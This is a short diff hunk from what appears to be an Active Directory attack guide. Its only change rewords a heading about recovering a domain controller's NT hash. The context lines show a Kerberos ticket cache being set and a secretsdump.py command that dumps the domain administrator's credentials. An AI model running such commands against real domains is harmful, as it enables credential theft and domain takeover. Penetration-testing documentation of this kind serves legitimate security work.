@@ -201,7 +201,7 @@ export KRB5CCNAME=dc01.ccache
 secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_FQDN>"
 ```
 
-#### Alternative — Recover the DC's NT Hash
+#### Alternative Way to Recover the DC's NT Hash
 
 ##### Extract the NT Hash
 
